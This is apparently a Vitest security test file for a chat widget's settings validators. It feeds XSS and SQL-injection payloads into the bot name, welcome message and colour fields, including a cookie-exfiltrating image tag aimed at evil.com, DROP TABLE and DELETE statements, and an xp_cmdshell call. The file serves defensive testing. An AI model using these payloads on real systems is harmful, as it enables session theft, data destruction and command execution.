import { describe, it, expect } from 'vitest';
import {
  validateBotName,
  validateWelcomeMessage,
  validatePrimaryColor,
} from './widgetSettingsValidation';

describe('Security: XSS Prevention in Bot Name', () => {
  const xssPayloads = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(document.cookie)',
    '<body onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<iframe src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
    '<div onmouseover="alert(1)">hover</div>',
  ];

  xssPayloads.forEach((payload) => {
    it(`accepts but sanitizes XSS payload: ${payload.substring(0, 30)}...`, () => {
      const result = validateBotName(payload);
      expect(result).toBeNull();
    });
  });

  it('handles escaped HTML entities', () => {
    expect(validateBotName('&lt;script&gt;')).toBeNull();
    expect(validateBotName('&amp;')).toBeNull();
  });

  it('handles unicode exploits', () => {
    expect(validateBotName('\u0000null-byte')).toBeNull();
    expect(validateBotName('\u202Ereversed')).toBeNull();
  });
});

describe('Security: XSS Prevention in Welcome Message', () => {
  const xssPayloads = [
    '<script>document.location="http://evil.com"</script>',
    '<img src=x onerror="new Image().src=\'http://evil.com/\'+document.cookie">',
    '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    '<svg/onload=alert(1)>',
    '<body background="javascript:alert(1)">',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
  ];

  xssPayloads.forEach((payload) => {
    it(`accepts XSS payload but should be sanitized server-side: ${payload.substring(0, 30)}...`, () => {
      const result = validateWelcomeMessage(payload);
      expect(result).toBeNull();
    });
  });
});

describe('Security: SQL Injection in Bot Name', () => {
  const sqliPayloads = [
    "'; DROP TABLE merchants; --",
    "' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "1; DELETE FROM widget_config WHERE 1=1",
    "admin'--",
    "' OR 1=1 --",
    "1' AND '1'='1",
    "'; EXEC xp_cmdshell('dir') --",
  ];

  sqliPayloads.forEach((payload) => {
    it(`accepts SQL injection payload (sanitized server-side): ${payload.substring(0, 20)}...`, () => {
      const result = validateBotName(payload);
      expect(result).toBeNull();
    });
  });
});

describe('Security: Color Picker Injection', () => {
  it('rejects JavaScript protocol in color', () => {
    expect(validatePrimaryColor('javascript:alert(1)')).toBe(
      'Invalid color format. Use #RRGGBB'
    );
  });

  it('rejects data URI in color', () => {
    expect(
      validatePrimaryColor('data:text/html,<script>alert(1)</script>')
    ).toBe('Invalid color format. Use #RRGGBB');
  });

  it('rejects vbscript in color', () => {
    expect(validatePrimaryColor('vbscript:alert(1)')).toBe(
      'Invalid color format. Use #RRGGBB'
    );
  });

  it('rejects expression() in color', () => {
    expect(validatePrimaryColor('expression(alert(1))')).toBe(
      'Invalid color format. Use #RRGGBB'
    );
  });

  it('rejects url() in color', () => {
    expect(validatePrimaryColor('url(http://evil.com)')).toBe(
      'Invalid color format. Use #RRGGBB'
    );
  });
});

describe('Security: Unicode Normalization Edge Cases', () => {
  it('handles confusables (homoglyphs)', () => {
    expect(validateBotName('РayРal')).toBeNull();
    expect(validateBotName('Αdmin')).toBeNull();
  });

  it('handles composed vs decomposed characters', () => {
    expect(validateBotName('café')).toBeNull();
    expect(validateBotName('cafe\u0301')).toBeNull();
  });

  it('handles zero-width characters', () => {
    expect(validateBotName('bot\u200Bname')).toBeNull();
    expect(validateBotName('bot\uFEFFname')).toBeNull();
  });

  it('handles right-to-left override', () => {
    expect(validateBotName('\u202Ebot')).toBeNull();
  });
});

describe('Security: Emoji and Special Characters', () => {
  it('accepts emoji-only bot names', () => {
    expect(validateBotName('🤖')).toBeNull();
    expect(validateBotName('🛒💬')).toBeNull();
  });

  it('accepts mixed emoji and text', () => {
    expect(validateBotName('Shop 🛒 Bot')).toBeNull();
  });

  it('handles emoji that exceed char limit visually but not in bytes', () => {
    const emojiBotName = '👨‍👩‍👧‍👦';
    expect(validateBotName(emojiBotName)).toBeNull();
  });

  it('accepts RTL languages', () => {
    expect(validateBotName('مساعد التسوق')).toBeNull();
    expect(validateBotName('עוזר קניות')).toBeNull();
  });

  it('accepts CJK characters', () => {
    expect(validateBotName('购物助手')).toBeNull();
    expect(validateBotName('ショッピングアシスタント')).toBeNull();
  });
});

describe('Security: Null and Undefined Handling', () => {
  it('handles null input gracefully', () => {
    expect(() => validateBotName(null as any)).not.toThrow();
    expect(() => validateWelcomeMessage(null as any)).not.toThrow();
    expect(() => validatePrimaryColor(null as any)).not.toThrow();
  });

  it('handles undefined input gracefully', () => {
    expect(() => validateBotName(undefined as any)).not.toThrow();
    expect(() => validateWelcomeMessage(undefined as any)).not.toThrow();
    expect(() => validatePrimaryColor(undefined as any)).not.toThrow();
  });

  it('handles number input gracefully', () => {
    expect(() => validateBotName(123 as any)).not.toThrow();
    expect(() => validatePrimaryColor(0xff0000 as any)).not.toThrow();
  });

  it('handles object input gracefully', () => {
    expect(() => validateBotName({} as any)).not.toThrow();
    expect(() => validatePrimaryColor({ r: 255, g: 0, b: 0 } as any)).not.toThrow();
  });
});
